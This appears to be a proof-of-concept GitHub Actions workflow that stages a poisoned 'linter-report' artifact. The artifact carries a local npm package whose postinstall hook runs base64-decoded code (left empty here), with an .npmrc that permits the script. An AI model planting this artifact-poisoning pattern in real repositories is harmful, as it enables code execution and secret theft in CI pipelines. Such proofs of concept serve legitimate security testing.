---
name: Lint
on:
  pull_request:

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - name: Stage attacker controlled artifact payload
        env:
          PR_NUMBER: ${{ github.event.pull_request.number }}
          HOOK_B64: 
        run: |
          echo "$PR_NUMBER" > pr-number.txt
          printf 'attacker supplied report text\n' > linter-report.txt
          printf 'allow-scripts=poc-evil\n' > .npmrc
          mkdir -p poc-evil
          cat > package.json <<'JSON'
          {"name":"poc-root","version":"1.0.0","private":true,"dependencies":{"poc-evil":"file:./poc-evil"}}
          JSON
          cat > poc-evil/package.json <<'JSON'
          {"name":"poc-evil","version":"1.0.0","scripts":{"postinstall":"node hook.js"}}
          JSON
          printf '%s' "$HOOK_B64" | base64 -d > poc-evil/hook.js
      - name: Upload linter report
        uses: actions/upload-artifact@v7
        with:
          name: linter-report
          include-hidden-files: true
          path: |
            pr-number.txt
            linter-report.txt
            .npmrc
            package.json
            poc-evil
